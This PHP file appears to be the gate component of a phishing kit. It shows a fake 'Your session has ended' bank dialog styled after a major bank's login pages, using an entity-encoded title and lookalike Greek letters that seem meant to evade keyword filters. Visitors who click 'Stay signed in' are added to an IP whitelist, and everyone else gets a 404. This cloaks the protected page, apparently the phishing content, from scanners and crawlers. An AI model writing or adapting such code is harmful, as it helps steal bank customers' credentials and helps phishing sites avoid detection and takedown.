<?php
$langcode = 'en'; // Default language. See Translations below
$wl       = '.ht_whitelist'; // whitelist file. Use .ht prefix in apache

/**
 * Translations
 */
$langs = array(
    'English' => 'en'
);

/**
 * Vars needed automatically replaced:
 * lang_output
 * curpagename
 * query_string
 * actionname
 *
 */

$get_msg['en'] = '
<header class="masthead" role="banner">
               	
                <div class="logoOuter">
                        <div class="logo">
                                <a href="/"><img alt="" style="position: absolute; top:12px; left:130px;" role="img" src="./assets/images/icn-layer-svg.svg"></a>                        
                        </div>	
                </div>	 
        
                <div id="navRight">
                        <nav class="navbar navbar-default navbar-fixed-top">
<div class="navbar-header">
<div class="entire-menu">
</div>
</div>
</nav>	
                </div>
        
</header>
<div class="container logon" data-is-view="true"><div><div id="backgroundImage"> <div class="jpui background image fixed" id="geoImage"></div>
<div id="overlay">
<div class="jpui modal" id="sessionTimeoutDialog" data-is-view="true"><div class="dialog vertical-center util print-position-initial" role="dialog"> <section class="dialogContent"><div class="modalContent"><div class="row"><div class="col-xs-12 col-sm-7 col-sm-offset-3"><h1 class="dialogTitle" tabindex="-1">Your session has ended.</h1> <div class="dialogMessage">We are unable to sign you in automatically. For your security, Stay signed in to confirm yοur infοrmation promptly.</div> </div></div> <div class="row"><div class="dialogButtonContainer"><div class="col-xs-6 col-sm-3 col-sm-offset-3"><form method="POST" action="{curpagename}">
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
	  <input type="submit" id="proceedToLogoff" class="bt_c" value="Stay signed in"/>
	     </form> </div> <div class="col-xs-6 col-sm-3"></div></div></div></div></section></div>  </div>
</div>';
	 

/** DO NOT MODIFY UNDER THIS LINE **/

/* Selected language */
if (isset($_POST['langcode'])) {
    $langcode = $_POST['langcode'];
}

/* Get translations buttons */
$lang_output = '';
foreach ($langs as $langname => $langcoded) {
    $lang_output .= '<form method="POST" style="float:left;"><input type="hidden" name="langcode" value="' . $langcoded . '" /><input type="submit" value="' . $langname . '"/></form>';
}
$lang_output .= '<div style="clear:both"></div>';

/**
 * FUNCTIONS
 */

/**
 * Get html header
 */
function _get_header()
{
    $page_header = '
<html>
<head>
<title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x50;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;</title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="assets/images/favicon.ico">
<link rel="stylesheet" type="text/css" href="./assets/css/smartphone-homepage.css" />
<link rel="stylesheet" type="text/css" href="./assets/css/style1.css" />
  <link rel="stylesheet" href="./assets/css/blue-ui.css">
</head>
<body>
  ';
    return $page_header;
}

/**
 * Get html footer
 */
function _get_footer()
{
    $page_footer = '

</body>
</html>';
    return $page_footer;
}

/**
 * Try to get current IP from current request
 */
function getRealIP()
{
    $client_ip = (!empty($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : ((!empty($_ENV['REMOTE_ADDR'])) ? $_ENV['REMOTE_ADDR'] : "unknown");
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $entries = mb_split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);
        reset($entries);
        while (list(, $entry) = each($entries)) {
            $entry = trim($entry);
            if (preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list)) { // http://www.faqs.org/rfcs/rfc1918.html
                $private_ip = array(
                    '/^0\./',
                    '/^127\.0\.0\.1/',
                    '/^192\.168\..*/',
                    '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
                    '/^10\..*/'
                );
                $found_ip   = preg_replace($private_ip, $client_ip, $ip_list[1]);
                if ($client_ip != $found_ip) {
                    $client_ip = $found_ip;
                    break;
                }
            }
        }
    }
    return $client_ip;
}

/**
 * Get protected script name
 */
function curPageName()
{
    return substr($_SERVER["SCRIPT_NAME"], strrpos($_SERVER["SCRIPT_NAME"], "/") + 1);
}

/**
 * Get url path of protected script name
 */
function curPathURL()
{
    $pageURL = 'http';
    if (array_key_exists('HTTPS', $_SERVER) && $_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"];
    }
    $parts = explode('/', $_SERVER['REQUEST_URI']);
    for ($i = 0; $i < count($parts) - 1; $i++) {
        $pageURL .= $parts[$i] . "/";
    }
    return $pageURL;
}

/**
 * Block access
 */
function blocked($get_msg, $langcode, $lang_output, $actionname)
{
    $data    = array(
        'lang_output' => $lang_output,
        'curPageName' => curPageName(),
        'actionname' => $actionname,
        'query_string' => $_SERVER['QUERY_STRING']
    );
    $content = replace_vars($get_msg[$langcode], $data);
    header("HTTP/1.0 404 Not Found");
    die(_get_header() . $content . _get_footer());
}

/**
 * Replace {vars} in translations
 */
function replace_vars($buffer, $data)
{
    /* replace declared var names */
    foreach ($data as $k => $v) {
        if (is_string($v) || is_numeric($v) || $v == NULL) {
            $buffer = preg_replace('/\{' . strtolower($k) . '\}/', $v, $buffer);
        }
    }
    return $buffer;
}

/** END FUNCTIONS ****/

/**
 * Vars
 */
$requester_IP = getRealIP(); // current requester IP
$wl_filename  = dirname(__FILE__) . '/' . $wl; // set full path whitelist file

/* Create/Open session */
session_start();

/* Check actionname */
if (isset($_SESSION['actionname']) AND isset($_POST['actionname'])) {
    
    if ($_SESSION['actionname'] == $_POST['actionname']) {
        
        /* Add IP to whitelist */
        $fh = fopen($wl_filename, 'a');
        fwrite($fh, $requester_IP . "\n");
        fclose($fh);
        
        /* Destroy current session */
        $_SESSION = array(); // destroys sesion parameters
        $_COOKIE  = array(); // destroys cookies parameters
        session_destroy();
        
        /* Redirects to protected script */
        if (!empty($_POST['query_string'])) {
            header('Location: ' . curPathURL() . curPageName() . '?' . $_POST['query_string']);
        } else {
            header('Location: ' . curPathURL() . curPageName());
        }
        die();
        
    } else {
        
        /* Get current actionname session */
        $actionname = $_SESSION['actionname'];
        
    }
    
} else {
    
    /* Create new actionname session */
    $actionname             = '.ht_' . uniqid();
    $_SESSION['actionname'] = $actionname;
    
}

/* Check whitelist */
if (is_file($wl_filename)) {
    $whitelist = file($wl_filename, FILE_IGNORE_NEW_LINES);
    
    /* is IP in whitelist? */
    if (!in_array($requester_IP, $whitelist)) {
        blocked($get_msg, $langcode, $lang_output, $actionname);
    }
    
} else {
    
    /* Empty whitelist */
    blocked($get_msg, $langcode, $lang_output, $actionname);
    
}
// Lets continue loading protected script
?>
